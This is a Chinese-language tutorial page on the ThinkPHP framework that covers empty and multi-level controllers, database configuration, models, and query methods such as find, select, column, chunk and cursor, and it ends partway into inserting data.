<p>&#x7A7A;&#x63A7;&#x5236;&#x5668;&#x7684;&#x6982;&#x5FF5;&#x662F;&#x6307;&#x5F53;&#x7CFB;&#x7EDF;&#x627E;&#x4E0D;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x63A7;&#x5236;&#x5668;&#x540D;&#x79F0;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x5C1D;&#x8BD5;&#x5B9A;&#x4F4D;&#x5F53;&#x524D;&#x5E94;&#x7528;&#x4E0B;&#x7684;&#x7A7A;&#x63A7;&#x5236;&#x5668;(<code>Error</code>)&#x7C7B;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#x548C;&#x8FDB;&#x884C;URL&#x7684;&#x4F18;&#x5316;&#x3002;</p>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x5355;&#x5E94;&#x7528;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7ED9;&#x9879;&#x76EE;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;<code>Error</code>&#x63A7;&#x5236;&#x5668;&#x7C7B;&#x3002;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/909c880ad2ea2b0f850c0a0c64997dd8.png" alt="909c880ad2ea2b0f850c0a0c64997dd8.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/51d1f41b65973cc25ccabef48f171d8a.png" alt="51d1f41b65973cc25ccabef48f171d8a.png"></p>
<p>&#x591A;&#x7EA7;&#x63A7;&#x5236;&#x5668;</p>
<p><a href="https://imgse.com/i/ppCRiX4" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCRiX4.png" alt="ppCRiX4.png"></a></p>
<p><a href="https://imgse.com/i/ppCR9pT" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCR9pT.png" alt="ppCR9pT.png"></a></p>
<h3 id="&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x548C;&#x6A21;&#x578B;">&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x548C;&#x6A21;&#x578B;</h3>
<p>.env&#x6587;&#x4EF6;&#x662F;&#x5728;&#x672C;&#x5730;&#x8FDE;&#x63A5;&#x6D4B;&#x8BD5;&#x7528;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/619250ff07b96ef8f4604e80e752d3e9.png" alt="619250ff07b96ef8f4604e80e752d3e9.png"></p>
<p>database.php&#x662F;&#x5728;&#x90E8;&#x7F72;&#x4E4B;&#x540E;&#x4F7F;&#x7528;&#xFF0C;&#x5728;&#x672C;&#x5730;&#x65F6;&#xFF0C;&#x4F18;&#x5148;&#x7EA7;&#x662F;.env&#x5927;&#x4E8E;database.php</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/06f53d4192dab54db365922de116f4c5.png" alt="06f53d4192dab54db365922de116f4c5.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/d576cdc1e06e33e9b25efa255a1bdf44.png" alt="d576cdc1e06e33e9b25efa255a1bdf44.png"></p>
<p>&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;datatest&#x7684;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x7528;&#x6765;&#x6D4B;&#x8BD5;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/872599a28b4d1bad1501272a3b1f3d32.png" alt="872599a28b4d1bad1501272a3b1f3d32.png"></p>
<p>&#x5982;&#x56FE;&#xFF0C;&#x5728;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;php10&#x6570;&#x636E;&#x4E0B;&#x8C03;&#x7528;</p>
<p>Db::table(&apos;msg&apos;)-&gt;select();&#x8C03;&#x7528;php10&#x5E93;&#x4E0B;&#x7684;msg&#x8868;&#xFF0C;&#x5E76;&#x4E14;&#x7528;select()&#x5168;&#x90E8;&#x663E;&#x793A;&#x8F93;&#x51FA;&#xFF0C;&#x6700;&#x540E;&#x7528;json&#x683C;&#x5F0F;&#x8F93;&#x51FA;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/dc2b0b2a664a6416ee3f914f1a42e08e.png" alt="dc2b0b2a664a6416ee3f914f1a42e08e.png"></p>
<p>&#x200B;    &#x5982;&#x679C;&#x60F3;&#x518D;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9700;&#x8981;&#x5728;database.php&#x4E2D;&#x8BBE;&#x7F6E;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/d1e6b81e99ee0445bdd275ba33565a6e.png" alt="d1e6b81e99ee0445bdd275ba33565a6e.png"><img src="https://s1.imagehub.cc/images/2023/01/27/aa027fbf499d0a60b437451b2e9cb586.png" alt="aa027fbf499d0a60b437451b2e9cb586.png"><img src="https://s1.imagehub.cc/images/2023/01/27/98fc0be261cd137ad1e440899a18f139.png" alt="98fc0be261cd137ad1e440899a18f139.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/8d70c470868577410265fe630fad44c9.png" alt="8d70c470868577410265fe630fad44c9.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/ca72e2f679edc5a6928f4a7ffdd4ff2c.png" alt="ca72e2f679edc5a6928f4a7ffdd4ff2c.png"></p>
<p>&#x3002;</p>
<p>&#x6A21;&#x578B;</p>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x6A21;&#x578B;&#x4E2D;&#x81EA;&#x5B9A;&#x4E49;&#x4E4B;&#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x6307;&#x5B9A;&#x8868;&#x540D;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/21d445f7da7048ac45d2b116c51d420d.png" alt="21d445f7da7048ac45d2b116c51d420d.png"><img src="https://s1.imagehub.cc/images/2023/01/27/1a9dc32aeb9d03a107b27180ba68b9f4.png" alt="1a9dc32aeb9d03a107b27180ba68b9f4.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/6bf2ce8a61bf8244ba54325da3111a6e.png" alt="6bf2ce8a61bf8244ba54325da3111a6e.png"></p>
<p>&#x540C;&#x7406;&#xFF0C;&#x6211;&#x53EF;&#x4EE5;&#x5C06;model&#x4E2D;&#x7684;mysql&#xFF08;&#x5BF9;&#x5E94;database.php&#x4E2D;&#x7684;mysql&#xFF09;&#xFF0C;&#x6539;&#x6210;test&#xFF0C;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;&#x53D6;test&#x6570;&#x636E;&#x5E93;&#x4E0B;&#x7684;&#x90A3;&#x4E2A;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/aeeee640cddcd0612a40ec2289cec0ca.png" alt="aeeee640cddcd0612a40ec2289cec0ca.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/16ac63091a8358a613bebe8377a60376.png" alt="16ac63091a8358a613bebe8377a60376.png"><img src="https://s1.imagehub.cc/images/2023/01/27/2aaefeaa0aad392a6931af3fc92f9e9c.png" alt="2aaefeaa0aad392a6931af3fc92f9e9c.png"></p>
<p>&#x3002;</p>
<h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x67E5;&#x8BE2;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x67E5;&#x8BE2;</h3>
<h4 id="&#x67E5;&#x8BE2;&#x5355;&#x4E2A;&#x6570;&#x636E;">&#x67E5;&#x8BE2;&#x5355;&#x4E2A;&#x6570;&#x636E;</h4>
<p>&#x67E5;&#x8BE2;&#x5355;&#x4E2A;&#x6570;&#x636E;&#x4F7F;&#x7528;<code>find</code>&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>// table&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x8868;&#x540D;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;find();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` = 1 LIMIT 1
</code></pre><blockquote>
<p><code>find</code>&#x65B9;&#x6CD5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8FD4;&#x56DE; <code>null</code>&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x6570;&#x7EC4;</p>
</blockquote>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/c398c7117d2fd5795945405edd7615f0.png" alt="c398c7117d2fd5795945405edd7615f0.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/2fa88f2b75bf458714933349921aeb07.png" alt="2fa88f2b75bf458714933349921aeb07.png"></p>
<pre><code class="lang-sql">        return Db::getLastsql();
</code></pre>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/8b2fae5d32531b96f3be006cf7b09dea.png" alt="8b2fae5d32531b96f3be006cf7b09dea.png"></p>
<p>&#x5982;&#x679C;&#x5E0C;&#x671B;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65F6;&#x5019;&#x8FD4;&#x56DE;&#x7A7A;&#x6570;&#x7EC4;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>// table&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x8868;&#x540D;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;findOrEmpty();
</code></pre><p>&#x5982;&#x679C;&#x5E0C;&#x671B;&#x5728;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x6570;&#x636E;&#x540E;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;findOrFail();
</code></pre><p>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x67E5;&#x627E;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x4E00;&#x4E2A;<code>think\db\exception\DataNotFoundException</code>&#x5F02;&#x5E38;&#x3002;</p>
<blockquote>
<p>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6; &#x5E76;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x8C03;&#x7528;<code>order</code>&#x65B9;&#x6CD5;&#x7684;&#x8BDD; &#xFF0C;<code>find</code>&#x67E5;&#x8BE2;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x7ED3;&#x679C;&#x3002;</p>
</blockquote>
<h4 id="&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x96C6;">&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x96C6;</h4>
<p>&#x67E5;&#x8BE2;&#x591A;&#x4E2A;&#x6570;&#x636E;&#xFF08;&#x6570;&#x636E;&#x96C6;&#xFF09;&#x4F7F;&#x7528;<code>select</code>&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;, 1)-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE `status` = 1
</code></pre><blockquote>
<p><code>select</code> &#x65B9;&#x6CD5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x5BF9;&#x8C61;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x7EC4;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
</blockquote>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/94a8dfd689c5b61dfedc1262784340bf.png" alt="94a8dfd689c5b61dfedc1262784340bf.png"></p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;, 1)-&gt;select()-&gt;toArray();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/aa1b71abebd159e30f7824b38381072b.png" alt="aa1b71abebd159e30f7824b38381072b.png"><img src="https://s1.imagehub.cc/images/2023/01/27/aa1b71abebd159e30f7824b38381072b.png" alt="aa1b71abebd159e30f7824b38381072b.png"></p>
<p>&#x5982;&#x679C;&#x5E0C;&#x671B;&#x5728;&#x6CA1;&#x6709;&#x67E5;&#x627E;&#x5230;&#x6570;&#x636E;&#x540E;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;,1)-&gt;selectOrFail();
</code></pre><p>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x67E5;&#x627E;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x540C;&#x6837;&#x4E5F;&#x4F1A;&#x629B;&#x51FA;&#x4E00;&#x4E2A;<code>think\db\exception\DataNotFoundException</code>&#x5F02;&#x5E38;&#x3002;</p>
<p>&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E86;&#x6570;&#x636E;&#x8868;&#x524D;&#x7F00;&#x53C2;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;find();
Db::name(&apos;user&apos;)-&gt;where(&apos;status&apos;, 1)-&gt;select();
</code></pre><blockquote>
<p>&#x5982;&#x679C;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8868;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x8868;&#x524D;&#x7F00;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;<code>name</code>&#x548C;<code>table</code>&#x65B9;&#x6CD5;&#x6548;&#x679C;&#x4E00;&#x81F4;&#x3002;</p>
</blockquote>
<p>&#x5728;<code>find</code>&#x548C;<code>select</code>&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6240;&#x6709;&#x7684;&#x94FE;&#x5F0F;&#x64CD;&#x4F5C;&#xFF08;&#x53C2;&#x8003;&#x94FE;&#x5F0F;&#x64CD;&#x4F5C;&#x7AE0;&#x8282;&#xFF09;&#x65B9;&#x6CD5;&#x3002;</p>
<h4 id="&#x503C;&#x548C;&#x5217;&#x67E5;&#x8BE2;">&#x503C;&#x548C;&#x5217;&#x67E5;&#x8BE2;</h4>
<p>&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x7528;</p>
<pre><code>// &#x8FD4;&#x56DE;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;value(&apos;name&apos;);
</code></pre><blockquote>
<p>value &#x65B9;&#x6CD5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8FD4;&#x56DE; null</p>
</blockquote>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/bed3c9454b3e021bb3996f62e9eefd51.png" alt="bed3c9454b3e021bb3996f62e9eefd51.png"><img src="https://s1.imagehub.cc/images/2023/01/27/acb9c39bd74a4c43a887ea3856967dec.png" alt="acb9c39bd74a4c43a887ea3856967dec.png"></p>
<p>&#x67E5;&#x8BE2;&#x67D0;&#x4E00;&#x5217;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x7528;</p>
<pre><code>// &#x8FD4;&#x56DE;&#x6570;&#x7EC4;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;,1)-&gt;column(&apos;name&apos;);
// &#x6307;&#x5B9A;id&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x7D22;&#x5F15;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;,1)-&gt;column(&apos;name&apos;, &apos;id&apos;);
</code></pre><p>&#x5982;&#x679C;&#x8981;&#x8FD4;&#x56DE;&#x5B8C;&#x6574;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#x503C;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>// &#x6307;&#x5B9A;id&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x7D22;&#x5F15; &#x8FD4;&#x56DE;&#x6240;&#x6709;&#x6570;&#x636E;
Db::table(&apos;think_user&apos;)-&gt;where(&apos;status&apos;,1)-&gt;column(&apos;*&apos;,&apos;id&apos;);
</code></pre><blockquote>
<p><code>column</code>&#x65B9;&#x6CD5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8FD4;&#x56DE;&#x7A7A;&#x6570;&#x7EC4;</p>
</blockquote>
<h4 id="&#x6570;&#x636E;&#x5206;&#x6279;&#x5904;&#x7406;">&#x6570;&#x636E;&#x5206;&#x6279;&#x5904;&#x7406;</h4>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x5904;&#x7406;&#x6210;&#x5343;&#x4E0A;&#x767E;&#x6761;&#x6570;&#x636E;&#x5E93;&#x8BB0;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4F7F;&#x7528;<code>chunk</code>&#x65B9;&#x6CD5;&#xFF0C;&#x8BE5;&#x65B9;&#x6CD5;&#x4E00;&#x6B21;&#x83B7;&#x53D6;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x4E00;&#x5C0F;&#x5757;&#xFF0C;&#x7136;&#x540E;&#x586B;&#x5145;&#x6BCF;&#x4E00;&#x5C0F;&#x5757;&#x6570;&#x636E;&#x5230;&#x8981;&#x5904;&#x7406;&#x7684;&#x95ED;&#x5305;&#xFF0C;&#x8BE5;&#x65B9;&#x6CD5;&#x5728;&#x7F16;&#x5199;&#x5904;&#x7406;&#x5927;&#x91CF;&#x6570;&#x636E;&#x5E93;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x5019;&#x975E;&#x5E38;&#x6709;&#x7528;&#x3002;</p>
<p>&#x6BD4;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5168;&#x90E8;&#x7528;&#x6237;&#x8868;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5206;&#x6279;&#x5904;&#x7406;&#xFF0C;&#x6BCF;&#x6B21;&#x5904;&#x7406; 100 &#x4E2A;&#x7528;&#x6237;&#x8BB0;&#x5F55;&#xFF1A;</p>
<pre><code class="lang-php">Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;chunk(<span class="hljs-number">100</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($users)</span> </span>{
    <span class="hljs-keyword">foreach</span> ($users <span class="hljs-keyword">as</span> $user) {
        <span class="hljs-comment">//</span>
    }
});
</code></pre>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/17ff18dda2340ef46961946724b506c8.png" alt="17ff18dda2340ef46961946724b506c8.png"><img src="https://s1.imagehub.cc/images/2023/01/27/30d1ac577881d90a6ce407b9265e9716.png" alt="30d1ac577881d90a6ce407b9265e9716.png"></p>
<p>&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4ECE;&#x95ED;&#x5305;&#x51FD;&#x6570;&#x4E2D;&#x8FD4;&#x56DE;<code>false</code>&#x6765;&#x4E2D;&#x6B62;&#x5BF9;&#x540E;&#x7EED;&#x6570;&#x636E;&#x96C6;&#x7684;&#x5904;&#x7406;&#xFF1A;</p>
<pre><code class="lang-php">Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;chunk(<span class="hljs-number">100</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($users)</span> </span>{
    <span class="hljs-keyword">foreach</span> ($users <span class="hljs-keyword">as</span> $user) {
        <span class="hljs-comment">// &#x5904;&#x7406;&#x7ED3;&#x679C;&#x96C6;...</span>
        <span class="hljs-keyword">if</span>($user-&gt;status==<span class="hljs-number">0</span>){
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }
    }
});
</code></pre>
<p>&#x4E5F;&#x652F;&#x6301;&#x5728;<code>chunk</code>&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#x8C03;&#x7528;&#x5176;&#x5B83;&#x7684;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code class="lang-php">Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)
-&gt;where(<span class="hljs-string">&apos;score&apos;</span>,<span class="hljs-string">&apos;&gt;&apos;</span>,<span class="hljs-number">80</span>)
-&gt;chunk(<span class="hljs-number">100</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($users)</span> </span>{
    <span class="hljs-keyword">foreach</span> ($users <span class="hljs-keyword">as</span> $user) {
        <span class="hljs-comment">//</span>
    }
});
</code></pre>
<p><code>chunk</code>&#x65B9;&#x6CD5;&#x7684;&#x5904;&#x7406;&#x9ED8;&#x8BA4;&#x662F;&#x6839;&#x636E;&#x4E3B;&#x952E;&#x67E5;&#x8BE2;&#xFF0C;&#x652F;&#x6301;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code class="lang-php">Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;chunk(<span class="hljs-number">100</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($users)</span> </span>{
    <span class="hljs-comment">// &#x5904;&#x7406;&#x7ED3;&#x679C;&#x96C6;...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
},<span class="hljs-string">&apos;create_time&apos;</span>);
</code></pre>
<p>&#x5E76;&#x4E14;&#x652F;&#x6301;&#x6307;&#x5B9A;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x987A;&#x5E8F;&#x3002;</p>
<pre><code class="lang-php">Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;chunk(<span class="hljs-number">100</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($users)</span> </span>{
    <span class="hljs-comment">// &#x5904;&#x7406;&#x7ED3;&#x679C;&#x96C6;...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
},<span class="hljs-string">&apos;create_time&apos;</span>, <span class="hljs-string">&apos;desc&apos;</span>);
</code></pre>
<blockquote>
<p><code>chunk</code>&#x65B9;&#x6CD5;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x547D;&#x4EE4;&#x884C;&#x64CD;&#x4F5C;&#x6279;&#x5904;&#x7406;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x9002;&#x5408;WEB&#x8BBF;&#x95EE;&#x5904;&#x7406;&#x5927;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x8D85;&#x65F6;&#x3002;</p>
</blockquote>
<h4 id="&#x6E38;&#x6807;&#x67E5;&#x8BE2;">&#x6E38;&#x6807;&#x67E5;&#x8BE2;</h4>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x5904;&#x7406;&#x5927;&#x91CF;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x65B0;&#x7248;&#x63D0;&#x4F9B;&#x7684;&#x6E38;&#x6807;&#x67E5;&#x8BE2;&#x529F;&#x80FD;&#xFF0C;&#x8BE5;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;&#x5229;&#x7528;&#x4E86;PHP&#x7684;&#x751F;&#x6210;&#x5668;&#x7279;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x5927;&#x5E45;&#x51CF;&#x5C11;&#x5927;&#x91CF;&#x6570;&#x636E;&#x67E5;&#x8BE2;&#x7684;&#x5185;&#x5B58;&#x5F00;&#x9500;&#x95EE;&#x9898;&#x3002;</p>
<pre><code class="lang-php">$cursor = Db::table(<span class="hljs-string">&apos;user&apos;</span>)-&gt;where(<span class="hljs-string">&apos;status&apos;</span>, <span class="hljs-number">1</span>)-&gt;cursor();
<span class="hljs-keyword">foreach</span>($cursor <span class="hljs-keyword">as</span> $user){
    <span class="hljs-keyword">echo</span> $user[<span class="hljs-string">&apos;name&apos;</span>];
}
</code></pre>
<p><code>cursor</code>&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x751F;&#x6210;&#x5668;&#x5BF9;&#x8C61;&#xFF0C;<code>user</code>&#x53D8;&#x91CF;&#x662F;&#x6570;&#x636E;&#x8868;&#x7684;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF08;&#x6570;&#x7EC4;&#xFF09;&#x3002;</p>
<h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;</h3>
<p>&#x66F4;&#x591A;&#x67E5;&#x8BE2;</p>
<p>&#x5982;&#x679C;&#x591A;&#x6B21;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6BCF;&#x6B21;&#x9759;&#x6001;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF0C;&#x9020;&#x6210;&#x6D6A;&#x8D39;&#x3002;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/8ea6393d6dc2ce6ded3fe0bcbb6b4101.png" alt="8ea6393d6dc2ce6ded3fe0bcbb6b4101.png"></p>
<h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x65B0;&#x589E;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x65B0;&#x589E;</h3>
<p>&#x5355;&#x6570;&#x636E;&#x65B0;&#x589E;</p>
<h5 id="strict">strict</h5>
<p><code>strict</code>&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x662F;&#x5426;&#x4E25;&#x683C;&#x68C0;&#x67E5;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// &#x5173;&#x95ED;&#x5B57;&#x6BB5;&#x4E25;&#x683C;&#x68C0;&#x67E5;
Db::name(&apos;user&apos;)
    -&gt;strict(false)
    -&gt;insert($data);
</code></pre><p>&#x6CE8;&#x610F;&#xFF0C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x503C;&#x662F;&#x7531;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x53C2;&#x6570;<code>fields_strict</code>&#x51B3;&#x5B9A;&#xFF0C;&#x56E0;&#x6B64;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5168;&#x5C40;&#x7684;&#x4E25;&#x683C;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// &#x5173;&#x95ED;&#x4E25;&#x683C;&#x68C0;&#x67E5;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#x5B58;&#x5728;
&apos;fields_strict&apos;  =&gt; false,
</code></pre><h6 id="&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;">&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;</h6>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>save</code>&#x65B9;&#x6CD5;&#x7EDF;&#x4E00;&#x5199;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x81EA;&#x52A8;&#x5224;&#x65AD;&#x662F;&#x65B0;&#x589E;&#x8FD8;&#x662F;&#x66F4;&#x65B0;&#x6570;&#x636E;&#xFF08;&#x4EE5;&#x5199;&#x5165;&#x6570;&#x636E;&#x4E2D;&#x662F;&#x5426;&#x5B58;&#x5728;&#x4E3B;&#x952E;&#x6570;&#x636E;&#x4E3A;&#x4F9D;&#x636E;&#xFF09;&#x3002;</p>
